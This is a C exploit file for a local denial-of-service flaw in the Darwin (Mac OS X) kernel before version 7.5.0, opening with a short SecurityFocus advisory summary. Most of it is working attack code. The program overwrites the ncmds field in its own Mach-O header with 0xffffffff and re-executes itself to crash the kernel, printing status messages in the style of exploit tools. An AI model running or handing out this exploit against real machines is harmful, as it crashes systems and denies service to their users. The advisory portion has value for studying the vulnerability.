/*
source: http://www.securityfocus.com/bid/12314/info

Reportedly a local integer overflow vulnerability affects the Darwin Kernel. This issue is due to a failure of the affected to properly handle integer signedness.

An attacker may leverage this issue to cause the affected computer to crash, denying service to legitimate users. It has been speculated that this issue may also be leverage to escalate privileges, although this is unconfirmed. 
*/

//---------------------( fm-nacho.c )--------------------------
/*
 * DoS for Darwin Kernel Version < 7.5.0
 * -(nemo@pulltheplug.org)-
 * 2005
 *
 * greetz to awnex, cryp, nt, andrewg, arc, mercy, amnesia ;)
 * irc.pulltheplug.org (#social)
 */

#include <stdio.h>

int main(int ac, char **av)
{
        FILE *me;
        int rpl = 0xffffffff;
        fpos_t pos = 0x10;
        printf("-( nacho - 2004 DoS for OSX (darwin < 7.5.0 )-\n");
        printf("-( nemo@pulltheplug.org )-\n\n");
        printf("[+] Opening file for writing.\n");
        if(!(me = fopen(*av,"r+"))) {
                printf("[-] Error opening exe.\n");
                exit(1);
        }
        printf("[+] Seeking to ncmds.\n");
        if((fsetpos(me,&pos)) == -1) {
                printf("[-] Error seeking to ncmds.\n");
                exit(1);
        }
        printf("[+] Changing ncmds to 0x%x.\n",rpl);
        if(fwrite(&rpl,4,1,me) < 1) {
                printf("[-] Error writing to file.\n");
                exit(1);
        }
        fclose(me);
        printf("[+] Re-executing with modified mach-o header.\n");
        sleep(5);
        if(execv(*av,av) == -1 ) {
                printf("[-] Error executing %s, please run manually.\n",*av);
                exit(1);
        }
        exit(0); // hrm
}